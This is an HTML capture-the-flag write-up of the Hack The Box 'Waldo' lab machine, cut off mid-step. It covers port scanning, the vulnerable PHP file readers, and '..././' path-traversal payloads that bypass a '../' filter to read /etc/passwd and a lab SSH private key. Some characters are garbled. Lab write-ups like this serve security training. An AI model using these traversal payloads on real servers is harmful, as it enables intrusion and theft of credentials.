I"Jè<h1 id="htb-waldo-10101087-machine-write-up">HTB Waldo (10.10.10.87) MACHINE WRITE-UP</h1>

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#tcp-port-80-http">TCP PORT 80 (http)</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</a></li>
  <li><a href="#part-5--lateral-movement-nobody---monitor">PART 5 : LATERAL MOVEMENT (nobody -&gt; monitor)</a></li>
  <li><a href="#part-6--privilege-escalation-monitor---root">PART 6 : PRIVILEGE ESCALATION (monitor -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.87
<span class="go">  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.87
<span class="go">
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
  |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
  |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
  80/tcp open  http    nginx 1.12.2
  | http-methods: 
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: nginx/1.12.2
  | http-title: List Manager
  |_Requested resource was /list.html
  |_http-trane-info: Problem with XML parsing of /evox/about

</span></code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80-http">TCP PORT 80 (http)</h3>

<ul>
  <li>
    <p><strong><code class="highlighter-rouge">http://10.10.10.87</code></strong>:</p>

    <p><img src="./screenshots/14_waldo/80_landing_page.png" alt="80 Landing Page" /></p>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>Opening the <strong>List Manager</strong> makes a POST request to <strong><code class="highlighter-rouge">dirRead.php</code></strong>:
        <pre><code class="language-pcap">POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 13
Connection: keep-alive
    
path=./.list/
</code></pre>
      </li>
      <li>Opening a list makes a POST request to <strong><code class="highlighter-rouge">fileRead.php</code></strong>:
        <pre><code class="language-pcap">POST /fileRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-type: application/x-www-form-urlencoded
Content-Length: 18
Connection: keep-alive

file=./.list/list1
</code></pre>
      </li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<ul>
  <li>Try reading the contents of <strong><code class="highlighter-rouge">dirRead.php</code></strong>:
    <ul>
      <li><strong><code class="highlighter-rouge">POST /fileRead.php</code></strong> | <strong><code class="highlighter-rouge">file=./dirRead.php</code></strong>:
        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"&lt;?php</span><span class="se">\n\n</span><span class="s2">if($_SERVER['REQUEST_METHOD'] === </span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">){</span><span class="se">\n\t</span><span class="s2">if(isset($_POST['path'])){</span><span class="se">\n\t\t</span><span class="s2">header('Content-type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">$_POST['path'] = str_replace( array(</span><span class="se">\"</span><span class="s2">..</span><span class="se">\/\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">..</span><span class="se">\\\"\"</span><span class="s2">), </span><span class="se">\"\"</span><span class="s2">, $_POST['path']);</span><span class="se">\n\t\t</span><span class="s2">echo json_encode(scandir(</span><span class="se">\"\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">www</span><span class="se">\/</span><span class="s2">html</span><span class="se">\/\"</span><span class="s2"> . $_POST['path']));</span><span class="se">\n\t</span><span class="s2">}else{</span><span class="se">\n\t\t</span><span class="s2">header('Content-type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">echo '[false]';</span><span class="se">\n\t</span><span class="s2">}</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div>        </div>
        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])){</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-type: application/json'</span><span class="p">);</span>
	    <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span> <span class="s2">"..</span><span class="se">\"</span><span class="s2">"</span><span class="p">),</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s2">"/var/www/html/"</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]));</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-type: application/json'</span><span class="p">);</span>
	    <span class="k">echo</span> <span class="s1">'[false]'</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
 
</code></pre></div>        </div>
      </li>
      <li><strong><code class="highlighter-rouge">POST /fileRead.php</code></strong> | <strong><code class="highlighter-rouge">file=./fileRead.php</code></strong>:
        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"&lt;?php</span><span class="se">\n\n\n</span><span class="s2">if($_SERVER['REQUEST_METHOD'] === </span><span class="se">\"</span><span class="s2">POST</span><span class="se">\"</span><span class="s2">){</span><span class="se">\n\t</span><span class="s2">$fileContent['file'] = false;</span><span class="se">\n\t</span><span class="s2">header('Content-Type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t</span><span class="s2">if(isset($_POST['file'])){</span><span class="se">\n\t\t</span><span class="s2">header('Content-Type: application</span><span class="se">\/</span><span class="s2">json');</span><span class="se">\n\t\t</span><span class="s2">$_POST['file'] = str_replace( array(</span><span class="se">\"</span><span class="s2">..</span><span class="se">\/\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">..</span><span class="se">\\\"\"</span><span class="s2">), </span><span class="se">\"\"</span><span class="s2">, $_POST['file']);</span><span class="se">\n\t\t</span><span class="s2">if(strpos($_POST['file'], </span><span class="se">\"</span><span class="s2">user.txt</span><span class="se">\"</span><span class="s2">) === false){</span><span class="se">\n\t\t\t</span><span class="s2">$file = fopen(</span><span class="se">\"\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">www</span><span class="se">\/</span><span class="s2">html</span><span class="se">\/\"</span><span class="s2"> . $_POST['file'], </span><span class="se">\"</span><span class="s2">r</span><span class="se">\"</span><span class="s2">);</span><span class="se">\n\t\t\t</span><span class="s2">$fileContent['file'] = fread($file,filesize($_POST['file']));  </span><span class="se">\n\t\t\t</span><span class="s2">fclose();</span><span class="se">\n\t\t</span><span class="s2">}</span><span class="se">\n\t</span><span class="s2">}</span><span class="se">\n\t</span><span class="s2">echo json_encode($fileContent);</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div>        </div>
        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 
 
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"POST"</span><span class="p">){</span>
    <span class="nv">$fileContent</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/json'</span><span class="p">);</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span> <span class="s2">"..""), "", </span><span class="nv">$_POST['file']</span><span class="s2">);
        if(strpos(</span><span class="nv">$_POST['file']</span><span class="s2">, "</span><span class="nx">user</span><span class="o">.</span><span class="nx">txt</span><span class="s2">") === false){
                </span><span class="nv">$file</span><span class="s2"> = fopen("</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="s2">" . </span><span class="nv">$_POST['file']</span><span class="s2">, "</span><span class="nx">r</span><span class="s2">");
                </span><span class="nv">$fileContent['file']</span><span class="s2"> = fread(</span><span class="nv">$file</span><span class="s2">,filesize(</span><span class="nv">$_POST['file']</span><span class="s2">));
                fclose();
        }
    }
    echo json_encode(</span><span class="nv">$fileContent</span><span class="s2">);
} 
</span></code></pre></div>        </div>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The base directory being used by <strong><code class="highlighter-rouge">dirRead.php</code></strong> and <strong><code class="highlighter-rouge">fileRead.php</code></strong> is <strong><code class="highlighter-rouge">/var/www/html/</code></strong>.</li>
      <li>Reading or listing files outside <strong><code class="highlighter-rouge">/var/www/html/</code></strong> will not work since the requested directory or file path will just be appended to the base directory.</li>
      <li>Backwards directory traversal are ‚Äúavoided‚Äù by converting <strong><code class="highlighter-rouge">../</code></strong> or <strong><code class="highlighter-rouge">.."</code></strong> to an empty string.</li>
      <li>This could be bypassed by requesting <strong><code class="highlighter-rouge">..././</code></strong> which would be converted to <strong><code class="highlighter-rouge">../</code></strong> since this and other functions like <code class="highlighter-rouge">preg_replace()</code> are not recursive.</li>
    </ul>
  </li>
</ul>

<blockquote>

</blockquote>

<ul>
  <li>Enumerate files outside the <strong><code class="highlighter-rouge">/var/www/html/</code></strong> directory:
    <ul>
      <li><strong><code class="highlighter-rouge">POST /fileRead.php</code></strong> | <strong><code class="highlighter-rouge">file=..././..././..././etc/passwd</code></strong>:
        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"root:x:0:0:root:</span><span class="se">\/</span><span class="s2">root:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">ash</span><span class="se">\n</span><span class="s2">bin:x:1:1:bin:</span><span class="se">\/</span><span class="s2">bin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">daemon:x:2:2:daemon:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">adm:x:3:4:adm:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">adm:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">lp:x:4:7:lp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">lpd:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sync:x:5:0:sync:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sync</span><span class="se">\n</span><span class="s2">shutdown:x:6:0:shutdown:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">shutdown</span><span class="se">\n</span><span class="s2">halt:x:7:0:halt:</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">halt</span><span class="se">\n</span><span class="s2">mail:x:8:12:mail:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">news:x:9:13:news:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">news:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">uucp:x:10:14:uucp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">uucppublic:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">operator:x:11:0:operator:</span><span class="se">\/</span><span class="s2">root:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">man:x:13:15:man:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">man:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">postmaster:x:14:12:postmaster:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">cron:x:16:16:cron:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">cron:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">ftp:x:21:21::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">ftp:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sshd:x:22:22:sshd:</span><span class="se">\/</span><span class="s2">dev</span><span class="se">\/</span><span class="s2">null:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">at:x:25:25:at:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">cron</span><span class="se">\/</span><span class="s2">atjobs:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">squid:x:31:31:Squid:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">cache</span><span class="se">\/</span><span class="s2">squid:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">xfs:x:33:33:X Font Server:</span><span class="se">\/</span><span class="s2">etc</span><span class="se">\/</span><span class="s2">X11</span><span class="se">\/</span><span class="s2">fs:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">games:x:35:35:games:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">games:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">postgres:x:70:70::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">postgresql:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">cyrus:x:85:12::</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">cyrus:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">vpopmail:x:89:89::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">vpopmail:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">ntp:x:123:123:NTP:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">empty:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">smmsp:x:209:209:smmsp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">mqueue:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">guest:x:405:100:guest:</span><span class="se">\/</span><span class="s2">dev</span><span class="se">\/</span><span class="s2">null:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">nobody:x:65534:65534:nobody:</span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">nobody:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">nginx:x:100:101:nginx:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">nginx:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/ash
...omitted...
operator:x:11:0:operator:/root:/bin/sh
...omitted...
postgres:x:70:70::/var/lib/postgresql:/bin/sh
...omitted...
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
...omitted...
</code></pre></div>        </div>
      </li>
      <li><strong><code class="highlighter-rouge">POST /dirRead.php</code></strong> | <strong><code class="highlighter-rouge">path=..././..././..././home/nobody/</code></strong>:
        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"."</span><span class="p">,</span><span class="s2">".."</span><span class="p">,</span><span class="s2">".ash_history"</span><span class="p">,</span><span class="s2">".ssh"</span><span class="p">,</span><span class="s2">".viminfo"</span><span class="p">,</span><span class="s2">"user.txt"</span><span class="p">]</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</h2>

<ul>
  <li>Check for credentials or private keys in the system:
    <ul>
      <li><strong><code class="highlighter-rouge">POST /dirRead.php</code></strong> | <strong><code class="highlighter-rouge">path=..././..././..././home/nobody/.ssh/</code></strong>:
        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"."</span><span class="p">,</span><span class="s2">".."</span><span class="p">,</span><span class="s2">".monitor"</span><span class="p">,</span><span class="s2">"authorized_keys"</span><span class="p">,</span><span class="s2">"known_hosts"</span><span class="p">]</span>
</code></pre></div>        </div>
      </li>
      <li><strong><code class="highlighter-rouge">POST /fileRead.php</code></strong> | <strong><code class="highlighter-rouge">file=..././..././..././home/nobody/.ssh/.monitor</code></strong>:
        <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"-----BEGIN RSA PRIVATE KEY-----</span><span class="se">\N</span><span class="s2">MIIEOGIBAAKCAQEAS7SYTDE++NHAWB9E+NN3V5T1DP1TYHC+4O8D362L5NWF6CPL</span><span class="se">\N</span><span class="s2">MR4JH6N4NCCDM1ZU+QB77LI8ZOVYMBTIEY4FM07X4PQT4ZENBFQKWKOCYV1TLW6F</span><span class="se">\N</span><span class="s2">87S0FZBHYAIZGRNNELLHB1IZIJPDVJUBSXG6S2CXALE14CJ+PNEIRTSYMIQ1NJCS</span><span class="se">\N</span><span class="s2">DGCC</span><span class="se">\/</span><span class="s2">GNPW</span><span class="se">\/</span><span class="s2">AANIN4VW9KSLLQIAEDJFCHY55SCJ5162Y9+I1XZQF8E9B12WVXIRVN</span><span class="se">\N</span><span class="s2">O8PLGNFJVW6SHHMPJSUE9VJAIEH+N+5XKBC8</span><span class="se">\/</span><span class="s2">6PCEOWQS9UJRKNZH9T1LJQ4FX1V</span><span class="se">\N</span><span class="s2">VI93DAQ3BZ3DHIIWAWAFMQZG+JSTHSWOIWR73WIDAQABAOIBADHWL</span><span class="se">\/</span><span class="s2">WDMUPEW6KU</span><span class="se">\N</span><span class="s2">VMZHRU3GCJUZWBET0TNEJBL</span><span class="se">\/</span><span class="s2">KXNWXR9B2I0DHWFG8IJW1LCU29NV8B+EHGP+BR</span><span class="se">\/</span><span class="s2">6</span><span class="se">\N</span><span class="s2">PKHMFP66350XYLNSQISHHIRMOSPYDGQVST4KBCP5VBTTDGC7RZF+EQZYEQFDRKW5</span><span class="se">\N</span><span class="s2">8KUNPTTMNWWLPYYJLSJMSRSN4BQYT3VRKTYKJ9IGU2RRKGXRNDCAC9EXGRUEVJ3Q</span><span class="se">\N</span><span class="s2">1H+7O8KGEPMKNEOGUGEJRN69HXYHFBEJ0WLLL8WORT9YUMMOX</span><span class="se">\/</span><span class="s2">05QOOBL4KQXUM7</span><span class="se">\N</span><span class="s2">VXI2YWU46+QTZTMEOKJOYLCGLYXDKG5ONDFDPBW3W8O6ULVFKV467M3ZB5YE8GES</span><span class="se">\N</span><span class="s2">DVA3YLECGYEA7JK51MVUGSIFF6GKXSNB</span><span class="se">\/</span><span class="s2">W2CZGE9TIXBWUQWEEIG0BMQQVX2ZWWO</span><span class="se">\N</span><span class="s2">V0OG0X</span><span class="se">\/</span><span class="s2">IROXACP6Z9WGPIC6FHVGJD</span><span class="se">\/</span><span class="s2">4BNLTR+A</span><span class="se">\/</span><span class="s2">LWQWFT1B6L03XDSYAIYIWI9XR</span><span class="se">\N</span><span class="s2">XSB2SLNWP56A</span><span class="se">\/</span><span class="s2">5TWTPOKFDBGCQRQHVUKWSHLYFOZGQA0ZTMNV71YKH0CGYEAWSSY</span><span class="se">\N</span><span class="s2">QFFDAWRVVZJP26YF</span><span class="se">\/</span><span class="s2">JNZAVLCAC5HMHO7EX5ISCVCX86MHQPEYAFCECZN2DFFOPQI</span><span class="se">\N</span><span class="s2">YZHZGB9N6Z01YUEKQRKNO3TA6JYJ9OJAMF8GZWVUTPZN41KSND4MWETBED4BUAH1</span><span class="se">\N\/</span><span class="s2">PACW</span><span class="se">\/</span><span class="s2">+</span><span class="se">\/</span><span class="s2">OYSH4BWKKNVHKNW36C+WMNOAX1FWQISCGYBYW</span><span class="se">\/</span><span class="s2">IMNLA3DRM3CIAA32IU</span><span class="se">\N</span><span class="s2">LROTP4QGAAMXPNCSMIPAGE6CRFVHIUOZ1SFNBV189Q8ZBM4PXQGKLLOJ8B33HDQ</span><span class="se">\/\N</span><span class="s2">LNN2N1WYTIYEUGA</span><span class="se">\/</span><span class="s2">QMDKOPB+TUFF1A5EZZZ0UR5WLLWA5NBEALDNOYTBK1P5N4KP</span><span class="se">\N</span><span class="s2">W7UYNREX6DGOBT2MD+10CQKBGGVQLYUNE20K9QSHVZTU3E9Z1RL+6LLDMZTFC3G9</span><span class="se">\N</span><span class="s2">1HLMBKDTJJJ</span><span class="se">\/</span><span class="s2">XAJAZUIOF4RS</span><span class="se">\/</span><span class="s2">INNKJ6+QYGKFAPRXXCPF9NACLQJAZGAMXW50AQT</span><span class="se">\N</span><span class="s2">RJ1BHUCZZCUGQABTPC6VYJ</span><span class="se">\/</span><span class="s2">HLLLZPIC05AIEHDDVTOPK</span><span class="se">\/</span><span class="s2">0WUY64FDS0VCCAYMMDR</span><span class="se">\N</span><span class="s2">X</span><span class="se">\/</span><span class="s2">PLAOGAS6UHBCM5TWZHTL</span><span class="se">\/</span><span class="s2">HDPROFAR3QKXWZ5XVAYKB90XGIPS5CWUGCCSVWQF2</span><span class="se">\N</span><span class="s2">DVVNY8GKBM</span><span class="se">\/</span><span class="s2">OENWHNTLWRTEJ5QDEAM40OJ</span><span class="se">\/</span><span class="s2">MWCDC6KPV1LJXRW2R5MCH9ZGBNFLA</span><span class="se">\N</span><span class="s2">W0IKCBUAM5XZGU</span><span class="se">\/</span><span class="s2">YSKMSCBMNMA8A5NDRWGFEFE+VGDVPARIE0RO=</span><span class="se">\N</span><span class="s2">-----END RSA PRIVATE KEY-----</span><span class="se">\N</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div>        </div>
        <pre><code class="language-rsa">-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
</code></pre>
      </li>
    </ul>
  </li>
  <li>Save the private key then change its permissions:
